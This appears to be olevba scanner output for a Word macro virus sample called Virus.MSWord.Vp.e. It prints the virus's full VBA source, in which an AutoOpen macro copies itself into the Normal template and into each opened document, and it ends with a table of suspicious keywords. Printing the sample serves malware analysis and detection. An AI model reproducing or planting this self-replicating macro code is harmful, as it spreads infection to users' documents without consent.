olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vp.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vp.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Vp.e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
                ' ŇĺńhnoVčđós(tm) fîr MińrîSîft Wîrd 6.Î-7.Î '
                ' (ń) 1997-98 ŇĺchnîSîft frîm Ňîmsk          '
    CheckInWindow
    CheckNormal

End Sub

Private Function vpInNormal()
Dim i

    vpInNormal = 0

    For i = 1 To WordBasic.CountMacros(0)
        If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then vpInNormal = -1
    Next

End Function

Private Sub CheckNormal()

    If Not vpInNormal Then WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", "Normal:AutoOpen"

End Sub

Private Function vpInWindow()
Dim i

    vpInWindow = 0

    For i = 1 To WordBasic.CountMacros(1)
        If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then vpInWindow = -1
    Next

End Function

Private Sub CheckInWindow()

1    If Not vpInWindow Then WordBasic.FileSaveAs Name:=WordBasic.[FileNameFromWindow$](), Format:=1: WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", WordBasic.[FileNameFromWindow$]() + ":AutoOpen": WordBasic.FileSaveAs Name:=WordBasic.[FileNameFromWindow$](), Format:=1

End Sub

'   ĚŕńrîŇĺńhnî ?!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

